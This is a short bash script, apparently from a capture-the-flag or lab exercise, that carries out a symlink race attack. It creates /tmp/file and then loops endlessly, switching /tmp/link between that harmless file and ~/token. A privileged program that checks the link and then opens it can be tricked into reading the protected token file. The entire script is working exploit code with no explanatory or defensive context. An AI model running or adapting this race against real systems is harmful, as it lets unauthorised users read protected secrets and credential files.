#!/bin/bash

echo 'file' > /tmp/file

while true; do
	ln -fs /tmp/file /tmp/link
    ln -fs ~/token /tmp/link
done